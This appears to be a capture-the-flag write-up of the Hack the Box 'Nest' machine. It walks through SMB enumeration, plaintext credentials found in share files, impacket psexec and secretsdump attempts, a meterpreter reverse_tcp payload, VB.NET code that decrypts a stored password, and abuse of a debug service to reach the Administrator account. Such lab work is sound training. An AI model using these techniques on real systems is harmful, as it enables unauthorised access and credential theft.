+++
title = "Hack the Box: Nest"
date = 2023-01-13
description = "Hack the Box: Nest"
tags = [
    "Hack the Box"
]
categories = [
    "Hack the Box"
]
series = ["Hack the Box"]
+++

Hack the Box: Nest

<!--more-->

# Nest

## Enumeration

### Nmap

```
# sudo nmap -A -p 445,4386 -T4 -Pn -nvv nest.htb -e tun0 

PORT     STATE SERVICE       REASON          VERSION
445/tcp  open  microsoft-ds? syn-ack ttl 127
4386/tcp open  unknown       syn-ack ttl 127
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
```

enum4linux gives nothing

```
# enum4linux 10.10.10.178
```

```
# smbclient -L \\\\10.10.10.178\\
Enter WORKGROUP\robin's password: 

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    Data            Disk      
    IPC$            IPC       Remote IPC
    Secure$         Disk      
    Users           Disk      
SMB1 disabled -- no workgroup available
```

We can find files in:

```
# smbclient \\\\nest.htb\\DATA
# smb: \Shared\Maintenance\> mget "Maintenance Alerts.txt"
# smb: \Shared\Templates\HR\> mget "Welcome Email.txt"
```

Inside Welcome\ Email.txt we have: `Username: TempUser Password: welcome2019`

## Foothold

```
# enum4linux -u TempUser -p welcome2019 10.10.10.178
# Domain Name: WORKGROUP
```

Nothing found from:

```
# sudo psexec.py WORKGROUP/TempUser:welcome2019@10.10.10.178
# sudo smbexec.py WORKGROUP/TempUser:welcome2019@10.10.10.178
# sudo wmiexec.py WORKGROUP/TempUser:welcome2019@10.10.10.178
# sudo secretsdump.py WORKGROUP/TempUser:welcome2019@10.10.10.178
# msf5 exploit(windows/smb/psexec
    # payload windows/x64/meterpreter/reverse_tcp
```

Let’s get back to smbclient then. `smbclient \\\\nest.htb\\DATA -U TempUser` then `recurse on` and we find in `config.xml` and `RU_config.xml`:

```
<Username>c.smith</Username>
<Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>

<File filename="C:\windows\System32\drivers\etc\hosts" />
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
<File filename="C:\Users\C.Smith\Desktop\todo.txt" />
```

smbclient \\10.10.10.178\Secure$ -U TempUser smb: > cd IT/Carl

smbget -rR smb://10.10.10.178/Secure$/IT/Carl -U TempUser On [https://dotnetfiddle.net/](https://dotnetfiddle.net/ "https://dotnetfiddle.net/") to get the decrypted password `C.Smith:xRxRxPANCAK3SxRxRx`

```
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils
    Public Class ConfigFile
    Public Property Port As Integer
    Public Property Username As String
    Public Property Password As String

    Public Sub SaveToFile(Path As String)
                        Using File As New System.IO.FileStream(Path, System.IO.FileMode.Create)
            Dim Writer As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Writer.Serialize(File, Me)
        End Using
    End Sub

    Public Shared Function LoadFromFile(ByVal FilePath As String) As ConfigFile
        Using File As New System.IO.FileStream(FilePath, System.IO.FileMode.Open)
            Dim Reader As New System.Xml.Serialization.XmlSerializer(GetType(ConfigFile))
            Return DirectCast(Reader.Deserialize(File), ConfigFile)
        End Using
    End Function
  
End Class
    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String
        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)
        Dim cipherTextBytes As Byte()
        cipherTextBytes = System.Convert.FromBase64String(cipherText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)
                Dim memoryStream As System.IO.MemoryStream
                memoryStream = New System.IO.MemoryStream(cipherTextBytes)
        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)
        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)
        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)
        memoryStream.Close()
        cryptoStream.Close()
        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)
    System.Console.WriteLine(plainText)
    Return plainText
    End Function

Public Class SsoIntegration
    Public Property Username As String
    Public Property Password As String
End Class
    
    Sub Main()
        Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}
    End Sub
End Class
```

## Privilege Escalation

`smbclient \\10.10.10.178\Users -U C.Smith smb: \C.Smith> mget user.txt`

`/home/robin/HQK_Config_Backup.xml telnet 10.10.10.178 4386`

`> DEBUG WBQ201953D8w setdir … setdir LDAP showquery 2`

`Domain=nest.local Port=389 BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local User=Administrator Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4`

AvaloniaILSpy & DnSpy

![](/img/nest1.png)

`XtH4nkS4Pl4y1nGX`

`sudo smbclient -E -U Administrator \\nest.htb\c$ XtH4nkS4Pl4y1nGX -c [sudo] password for robin: Try “help” to get a list of possible commands. smb: > get \Users\Administrator\Desktop\root.txt`

`cat \\Users\Administrator\Desktop\root.txt 6594c2eb084bc0f08a42f0b94b878c41`